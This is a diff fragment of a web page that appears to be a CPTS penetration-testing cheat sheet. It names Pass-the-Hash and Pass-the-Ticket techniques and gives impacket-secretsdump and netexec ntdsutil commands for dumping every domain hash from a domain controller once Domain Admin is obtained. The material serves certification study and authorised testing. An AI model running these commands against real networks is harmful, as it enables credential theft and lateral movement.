+              <pre class="sc-cmd"><code># hash -&gt; Pass-the-Hash; key -&gt; OverPass-the-Hash; cert -&gt; PKINIT; ticket -&gt; Pass-the-Ticket</code></pre>
+              <a class="sc-step-link" href="/cpts/credential-access/">Credential access &amp; lateral movement &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+          <li class="sc-item" data-search="i have domain admin dump everything and prove it. dcsync or dump ntds.dit for every domain hash. impacket-secretsdump &#39;domain.local/user:pass@dc&#39; -just-dc-ntlm netexec smb dc -u user -p pass -m ntdsutil ntds dump">
+          <details class="sc-box">
+            <summary class="sc-summary">
+              <span class="sc-label">I have Domain Admin</span>
+              <span class="sc-detail">Dump everything and prove it.</span>
+            </summary>
+            <ol class="sc-steps">
+            <li class="sc-step">
+              <p class="sc-step-text">DCSync or dump NTDS.dit for every domain hash.</p>
+              <pre class="sc-cmd"><code>impacket-secretsdump &#39;domain.local/user:pass@DC&#39; -just-dc-ntlm
+netexec smb DC -u user -p pass -M ntdsutil</code></pre>
+              <a class="sc-step-link" href="/cpts/password-cracking/">NTDS dump &rarr;</a>
+            </li>
+            </ol>
+          </details>
+        </li>
+        </ul>
+      </section>
+          <p class="sc-empty" id="sc-empty" hidden>No play matches. Try a service, a port, or clear the search.</p>
+        </div>
+      </main>
+      <footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/talks/">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer>
+    </div>
+    <script type="module" src="/cpts/start/start.js?v=sc1"></script>
+  </body>
+</html>
